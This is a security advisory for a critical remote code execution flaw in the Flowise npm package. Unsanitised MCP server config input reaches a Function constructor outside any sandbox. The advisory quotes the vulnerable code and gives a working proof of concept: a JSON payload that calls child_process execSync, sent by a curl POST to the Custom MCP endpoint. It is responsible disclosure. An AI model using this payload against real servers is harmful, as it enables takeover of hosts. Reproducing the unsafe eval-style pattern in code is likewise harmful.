# [C] Flowise vulnerable to RCE via Dynamic function constructor injection

## Summary
Severity: Critical
Advisory: GHSA-hmgh-466j-fx4c
CVE: CVE-2025-55346
CWE: CWE-627, CWE-95
Ecosystem: npm
CVSS: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2025-10-06
Source: https://github.com/advisories/GHSA-hmgh-466j-fx4c
Type: github-advisory

## Affected
- npm: `flowise` — affected >=0

## Details
### Summary
User-controlled input flows to an unsafe implementaion of a dynamic Function constructor , allowing a malicious actor to run JS code in the context of the host (not sandboxed) leading to RCE. 

### Details
When creating a new `Custom MCP` Chatflow in the platform, the MCP Server Config displays a placeholder hinting at an example of the expected input structure:
```json
{
	"command": "npx",
	"args": ["-y", "@modelcontextprotocol/server-filesystem", "/path/to/allowed/files"]
}
```

Behind the scene, a `POST` request to `/api/v1/node-load-method/customMCP` is sent with the provided MCP Server Config, with additional parameters (excluded for brevity):
```json
{
...SNIP...

   "inputs":{
      "mcpServerConfig":{
         "command":"npx",
         "args":[
            "-y",
            "@modelcontextprotocol/server-filesystem",
            "/path/to/allowed/files"
         ]
      }
   },
   "loadMethod":"listActions"
   
...SNIP...
}
```

Sending the same request with the parameter `mcpServerConfig` equals to a plain value and not an object, for example:
```json
{
   "inputs":{
      "mcpServerConfig":"test"
   },
   "loadMethod":"listActions"
}
```

We enter an interesting code flow that leads to a function named `convertValidJSONString` (Line 103):
https://github.com/FlowiseAI/Flowise/blob/416e57380ea7ce2e66f89aded61b249ff3eef3b2/packages/components/nodes/tools/MCP/CustomMCP/CustomMCP.ts#L103

```typescript
async getTools(nodeData: INodeData): Promise<Tool[]> {
        const mcpServerConfig = nodeData.inputs?.mcpServerConfig as string

        if (!mcpServerConfig) {
            throw new Error('MCP Server Config is required')
        }

        try {
            let serverParams
            if (typeof mcpServerConfig === 'object') {
                serverParams = mcpServerConfig
            } else if (typeof mcpServerConfig === 'string') {
                const serverParamsString = convertToValidJSONString(mcpServerConfig) <--
                serverParams = JSON.parse(serverParamsString)
            }

            const toolkit = new MCPToolkit(serverParams, 'stdio')
            await toolkit.initialize()

            const tools = toolkit.tools ?? []

            return tools as Tool[]
        } catch (error) {
            throw new Error(`Invalid MCP Server Config: ${error}`)
        }
    }
}
```

Here, the value of `inputString` originating from `mcpServerConfig` is being concatenated to a dynamic Function constructor that evaluates the provided value similar to using `eval`:

```typescript
function convertToValidJSONString(inputString: string) {
    try {
        const jsObject = Function('return ' + inputString)()
        return JSON.stringify(jsObject, null, 2)
    } catch (error) {
        console.error('Error converting to JSON:', error)
        return ''
    }
}
```

This JS code runs in the context of the host, not sandboxed using `@flowiseai/nodevm` like other code execution functionalities within the platform.

This enables access to the global `process` object and as a result access to all the native NodeJS modules available such as `child_process`, leading to Remote Code Execution.
```json
{
    "inputs":{
        "mcpServerConfig":"(global.process.mainModule.require('child_process').execSync('touch /tmp/yofitofi'))"
        },
    "loadMethod":"listActions"
}
```
### PoC
1. Follow the provided instructions for running the app using Docker Compose (or other methods of your choosing such as `npx`, `pnpm`, etc):
   https://github.com/FlowiseAI/Flowise?tab=readme-ov-file#-docker

2. Create a new file named `payload.json` somewhere in your machine, with the following data:
```
{"inputs":{"mcpServerConfig":"(global.process.mainModule.require('child_process').execSync('touch /tmp/yofitofi'))"},
"loadMethod":"listActions"}
```

3. Send the following `curl` request using the `payload.json` file created above with the following command:
```
curl -XPOST -H "x-request-from: internal" -H "Content-Type: application/json" --data @payload.json "http://localhost:3000/api/v1/node-load-method/customMCP"
```

4. Observe that a new file named `yofitofi` is created under `/tmp` folder.
### Impact
Remote code execution

## Credit
The vulnerability was discovered by Assaf Levkovich of the JFrog Security Research team.

## References
- https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-hmgh-466j-fx4c
- https://nvd.nist.gov/vuln/detail/CVE-2025-55346
- https://github.com/FlowiseAI/Flowise
- https://research.jfrog.com/vulnerabilities/flowise-js-injection-remote-code-exection-jfsa-2025-001379925
